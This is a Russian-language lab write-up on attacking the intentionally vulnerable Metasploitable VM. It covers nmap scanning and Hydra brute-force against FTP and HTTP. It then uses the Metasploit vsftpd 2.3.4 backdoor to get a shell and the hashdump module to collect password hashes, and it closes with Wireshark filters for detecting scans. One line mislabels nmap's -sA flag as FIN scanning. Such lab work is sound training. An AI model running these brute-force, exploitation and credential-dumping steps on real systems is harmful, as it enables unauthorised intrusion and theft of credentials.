# Уязвимости и атаки на информационные системы
- Качаем дистриб Kali linux 
- Качаем  виртуальную машину Metasploitable: https://sourceforge.net/projects/metasploitable/

Просканируйте эту виртуальную машину, используя nmap.
Попробуйте найти уязвимости, которым подвержена эта виртуальная машина.
Сами уязвимости можно поискать на сайте https://www.exploit-db.com/.
Для этого нужно в поиске ввести название сетевой службы, обнаруженной на атакуемой машине, и выбрать подходящие по версии уязвимости.


## NMAP: основные режимы сканирования
-sS: TCP SYN-сканирование

-sT: TCP connect-сканирование

-sА: TCP FIN-сканирование

-sU: UDP-сканирование

-sX: Xmas-сканирование

-PR: ARP-пинг

--traceroute: трассировка пути

-R: разрешение имен DNS

-n: запрещение разрешения имен DNS

-sL: создать список хостов


 Попробуем разные режимы 
![alt text](image.png)
![alt text](image-1.png)
![alt text](image-2.png)

Агрессивный режим сканирования (-A) – наиболее часто используемый
![alt text](image-3.png)

-sV: версия софта
![alt text](image-4.png)


Сами уязвимости можно поискать на сайте https://www.exploit-db.com/.

![alt text](image-5.png)

## эксперемент с HYDRA 
создадим два файлика 
![alt text](image-6.png)
а в идеале качаем готовый seclist
```
 hydra -L user.txt -P pwd.txt ftp://192.168.31.121
```   
![alt text](image-7.png)
```
hydra -L user.txt -P pwd.txt 192.168.31.121 http-get
```
![alt text](image-8.png)


# METASPLOIT
```
kali@kali:~$ sudo service postgresql start
kali@kali:~$ sudo msfdb init
```
```
kali@kali:~$ sudo msfconsole
msf5 > db_status
```
![alt text](image-9.png)

![alt text](image-10.png)
подключим модуль сканнера 
```
use auxiliary/scanner/ftp/ftp_version
```
![alt text](image-11.png)
Добавим переменнную ``RHOSTS``
```
setg RHOSTS 192.168.31.121
run
```
![alt text](image-12.png)
Получили баннер
![alt text](image-14.png)

Подключаем модуль
```
use exploit/unix/ftp/vsftpd_234_backdoor
run
```
![alt text](image-15.png)

попали в shell
![alt text](image-16.png)
![alt text](image-17.png)

Для сбора хешей паролей
Переведем нашу сессию в фоновый режим: ``Ctrl-Z``
```
sessions -l проверим сессии
```
```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > use post/linux/gather/hashdump
```
```
msf5 post(linux/gather/hashdump) > show options
```
![alt text](image-18.png)
```
msf5 post(linux/gather/hashdump) > set session 1
msf5 post(linux/gather/hashdump) > run
```

![alt text](image-19.png)


Мы получили хэши паролей пользователей сервера.

![alt text](image-20.png)

Если вы хотите перейти к сессии №1 (например, к shell после эксплуатации vsftpd):

```
sessions -i 1
```
Если сессия "висит" в фоне
``jobs -l ``   # проверка фоновых задач
``fg %1  ``    # вернуться к задаче №1

# Анализ трафика с помощью Wireshark

![alt text](image-21.png)

![alt text](image-22.png)

Специфические фильтры для каждого типа

SYN-сканирование:

```tcp.flags.syn == 1 && tcp.flags.ack == 0```

FIN-сканирование:


```tcp.flags.fin == 1 && tcp.flags.ack == 0```

Xmas-сканирование:


```tcp.flags.fin == 1 && tcp.flags.psh == 1 && tcp.flags.urg == 1```
